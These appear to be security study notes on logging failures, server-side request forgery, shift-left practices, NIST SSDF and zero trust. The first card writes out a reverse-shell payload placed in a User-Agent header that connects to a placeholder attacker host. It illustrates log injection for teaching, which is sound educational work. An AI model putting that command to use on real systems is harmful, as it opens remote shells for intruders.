
Security Logging and Monitoring Failures Attack Scenario
- An attacker inserts malicious code into a log file entry by manipulating user input to a web application
- Injects the code into the user agent string: `User-Agent: Mozilla/5.0; /bin/bash -i >& /dev/tcp/attacker_ip/443 0>&1`

Security Logging and Monitoring Failures Attack Scenario
- Ensure all security related events (login success & failures, access control changes) are logged
- Establish a documented, tested incident response plan/playbook

Server-Side Request Forgery
- An attack vector that exploits an application to interact with the internal/external network or the machine itself

Server-Side Request Forgery Typical Vuln
- Failed web server request validation
- Poor internal network segmentation to restrict lateral movement

Server-Side Request Forgery Prevention
- Enable authentication to all internal systems
- Deploy whitelists of DNS/IP addresses that an application is allowed to access


Shift Left Security
- Incorporating security requirements, security design and security testing earlier in the Software Development Lifecycle (SDLC).

Goals of Shift Left Security
- Identify security design flaws & vulnerabilities as early as possible in the development lifecycle.
- Ensure secure design principles are applied during the design phase

Shift Left Security Common Practices
- Security Policy
- Threat Modelling
- Secure Coding Practices

Shift Left Security - Separation of Privilege
- For highly sensitive operations, split responsibilities between two or more people
- No single person has complete control; requires collusion to exploit

NIST Secure Software Development Framework
- A set of high-level practices based on established standards, guidance and existing secure software development practices
- Provides a basis for planning and implementing a risk-based approach to implementing secure software development practices

Zero Trust
- A security model that eliminates implicit trust, instead focusing on the continuous evaluation of explicit access and trust levels

Zero Trust Tenets
- Assumes a hostile network; that is that an attacker is present
- Does not assume trust based on granted access to a network
- Continuously evaluates trust based on client identity, device characteristics, behavioural and environmental attributes

Zero Trust Assumptions
- Devices on the network may not be owned or configurable by the enterprise
- Remote enterprise subjects and assets cannot fully trust their local network connection
- Assets and workflows moving between enterprise and non-enterprise infrastructure should have a consistent security policy and posture